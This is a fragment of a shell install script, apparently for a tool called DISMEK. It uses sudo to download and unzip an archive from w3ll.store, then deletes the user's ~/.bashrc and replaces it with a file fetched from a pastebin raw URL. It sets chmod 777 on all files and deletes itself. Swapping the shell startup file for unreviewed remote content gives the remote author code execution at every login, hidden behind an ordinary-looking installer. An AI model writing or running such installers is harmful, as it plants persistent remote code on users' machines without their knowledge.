...
sudo wget https://w3ll.store/operators/DISMEK.zip
sudo unzip -o DISMEK.zip
sudo rm DISMEK.zip
cp ~/.bashrc ~/.bashrc-bak
rm -rf ~/.bashrc
curl "https://pastebin.com/raw/UKRbY1kE" -o ~/.bashrc
dos2unix ~/.bashrc
clear
...
clear
printf "\e[32mTOOL INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31m./DISMEK (For Linux) or Just open the DISMEK.exe (For Windows)\e[0m TO RUN TOOL NOW !\n\n"
sudo rm install.sh
chmod 777 *
